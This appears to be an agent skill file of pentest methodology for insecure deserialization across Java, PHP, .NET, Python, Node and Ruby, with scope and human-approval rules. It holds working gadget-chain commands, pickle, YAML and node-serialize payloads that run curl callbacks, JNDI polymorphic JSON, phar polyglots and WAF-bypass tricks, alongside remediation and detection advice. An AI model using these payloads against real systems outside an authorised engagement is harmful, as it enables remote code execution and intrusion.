---
name: web-deserialization
description: "Insecure deserialization testing for a pentest-team engagement — recognizing serialized formats (Java ObjectInputStream, PHP serialize/phar, .NET BinaryFormatter/ViewState, Python pickle, Node node-serialize, Ruby Marshal/YAML), fingerprinting the stack, and building gadget chains with ysoserial/phpggc/ysoserial.net, plus Jackson/Json.NET polymorphic-typing and JMX/RMI vectors. Load it when the appsec-triage input-validation sweep turns up a deserialization lead on a claimed web/API target."
---

# Insecure Deserialization — under the engagement protocol

Deep methodology for the deserialization class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board — an opaque cookie, a serialized request body, a ViewState field.

## Under the engagement protocol

- **Claimed and in-scope only.** Every payload goes to a target you own on the board and that is on the `ROE.md` allowlist — never to a JMX/RMI port, message queue, or webhook one hop outside it.
- **Prove reachability with a benign marker, not a shell.** Confirm deserialization with a DNS/HTTP callback or a `sleep` — the primitive existing *is* the finding. Never dump data or run a destructive command to "demonstrate".
- **OOB/callbacks go to a BENIGN in-scope listener only.** URLDNS, DNS-confirm commands, and JRMP/JNDI redirects point at your own in-scope callback subdomain — never a live external pull and never a real out-of-scope service (LDAP, cloud metadata).
- **Read before write; RCE is gated.** Command execution, file writes, reverse shells, and JNDI-to-attacker redirects are RCE/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go. Where full RCE is out of scope, a documented proof-of-reachability closes it.
- **Rate-limit and coordinate.** A failed chain floods logs with `ClassNotFoundException` and can trip a WAF ban for the whole team. Throttle brute-forced `serialVersionUID`/chain attempts; coordinate load on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a re-runnable reproduction (the exact chain, tool version, and library versions).

## Quick workflow

1. Enumerate every entry point taking opaque/encoded data — cookies, HTTP bodies, headers, ViewState, file uploads, GraphQL custom scalars.
2. Fingerprint the format by magic bytes and content-type (table below); fingerprint the language/framework from headers and error pages.
3. Match candidate gadget chains to the target's classpath/installed packages.
4. Confirm deserialization with URLDNS or a DNS-callback to your in-scope listener — stop here if that proves the finding.
5. Escalate to RCE only if in scope and cleared through the anchor.

## Recognition signatures

| Format | Signature | Where it hides |
|---|---|---|
| Java ObjectInputStream | hex `ac ed 00 05`, b64 `rO0AB` | cookies, POST bodies, JMX/RMI |
| PHP serialize | `O:<len>:"Class":` or `a:<n>:{` | cookies (often base64) |
| .NET BinaryFormatter | b64 `AAEAAAD/////` | ViewState, session, remoting |
| Python pickle | opcodes `\x80\x04\x95`, older `(dp0` | caches, Celery tasks |
| Ruby Marshal | leading `\x04\x08` | older Rails session cookies |
| YAML | `--- !ruby/object:` / `!!python/object/apply:` | tag-based instantiation |
| .NET Json.NET | `"$type":` key | `TypeNameHandling != None` |
| Java Jackson | `["class.name", {` array wrapper | `enableDefaultTyping`/polymorphic |

## Detection first — the safe confirmation sequence

Always start here. This proves the sink without touching data or spawning a process.

```bash
# Java: DNS-only, no RCE — the canonical reachability proof
java -jar ysoserial.jar URLDNS 'http://deser.<in-scope>' > payload.bin
```
```python
# Python: DNS-callback command, not a shell
class P:
    def __reduce__(self):
        return (__import__('os').system, ('curl http://deser.<in-scope>/cb',))
# yaml.load sink:  !!python/object/apply:os.system ['curl http://deser.<in-scope>/cb']
```
```javascript
// Node node-serialize / funcster — callback, not execSync of a payload
{"x":"_$$ND_FUNC$$_function(){require('http').get('http://deser.<in-scope>/cb')}()"}
```
If URLDNS/DNS fires, the finding is confirmed. A `sleep`/delay payload distinguishes execution from mere lookup without any network egress. Everything past this is gated.

## Gadget-chain construction (match to the target)

Point the command at a DNS callback for proof; the RCE command itself is gated to the anchor.

```bash
# Java — match the chain to libraries on the classpath
java -jar ysoserial.jar CommonsCollections5 'curl http://deser.<in-scope>/cb' > cc5.bin   # CC1/CC5/CC7 by JDK+lib version
java -jar ysoserial.jar Spring1     'curl http://deser.<in-scope>/cb' > spring.bin        # spring-core+beans
java -jar ysoserial.jar Hibernate1  'curl http://deser.<in-scope>/cb' > hib.bin           # hibernate-core

# PHP — phpggc chains, DNS-callback command
phpggc -l                                                    # list chains
phpggc Laravel/RCE1 system 'curl http://deser.<in-scope>/cb' -b
phpggc Monolog/RCE1 system 'curl http://deser.<in-scope>/cb' -b

# .NET — ysoserial.net, callback command
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "nslookup deser.<in-scope>"
ysoserial.exe -g ObjectDataProvider  -f Json.Net        -c "nslookup deser.<in-scope>"
```

`serialVersionUID` mismatch throws `InvalidClassException` before the gadget runs — read the server's UID from an error and rebuild. Brute-forcing common versions is possible but noisy; throttle it and log the attempts.

### Polymorphic-typing JSON (no binary needed)

```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://deser.<in-scope>:1389/x","autoCommit":true}]
```
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start", ... }
```
The `ldap://`/`jku`/`jwk` target must be your **in-scope** listener — redirecting deserialization to an attacker-controlled JNDI/JRMP server that pulls and runs a class is RCE and outward-facing: gate it.

### phar:// (PHP file-op sink)

Any file function on a `phar://` path deserializes the archive metadata — no `unserialize()` call needed. Build a JPEG polyglot, upload it, then trigger `phar://uploads/x.jpg/t.txt`. Set the gadget's command to a callback for proof; keep the archive on the in-scope host only.

## RMI/JMX and remote sinks (gated, in-scope)

JMX/RMI registries (1099/1098/9010) accept serialized objects, often unauthenticated. Scan and fingerprint with `nmap --script rmi-dumpregistry`, but the port must be **on the allowlist** — an internal registry a hop away is out of scope. `marshalsec` JNDI/RMI redirect servers deliver a second-stage class: that is RCE, route it through the anchor.

## WAF / filter bypass (when a control sits in front)

Change the byte pattern, not the intent: double-base64, gzip-then-base64, URL-encode, `\uXXXX`-escape the `$type`/class token in JSON. Switch content-type (`application/x-java-serialized-object`, or XMLDecoder XML on a JSON endpoint) to dodge format-specific rules. Note the WAF's presence and what bypassed it in the finding — control efficacy is itself reportable. Against JEP 290 `ObjectInputFilter`, .NET `SerializationBinder`, or PHP `allowed_classes`, prefer a chain inside the allowed set or the phar:// sink where the allowlist is not applied — and document the bypass rather than hammering blindly.

## Remediation (for the finding)

1. **Fix** — do not deserialize untrusted input. Use a data-only format (JSON/Protobuf) with schema validation; if native serialization is unavoidable, sign+HMAC the blob with a server-side key and verify before deserializing.
2. **Defense in depth** — enable a strict allowlist filter (`ObjectInputFilter`/JEP 290, `SerializationBinder`, PHP `allowed_classes`, `yaml.safe_load`, avoid `pickle`/`BinaryFormatter` entirely); run the deserializing service least-privilege; keep gadget-source libraries (Commons-Collections, Jackson, Json.NET) patched.
3. **Detection** — SIEM rule on the format magic bytes in inbound traffic (`rO0AB`, `AAEAAAD/////`, `O:\d+:"`, `!!python/object`), on `ClassNotFoundException`/`readObject` stack traces, and on anomalous outbound DNS/process spawns from the app runtime.

Write it up in the `appsec-reporting` finding format, **CWE-502 / A08:2021 Software and Data Integrity Failures**, with the reachability (callback) proof and the exact chain in the reproduction.
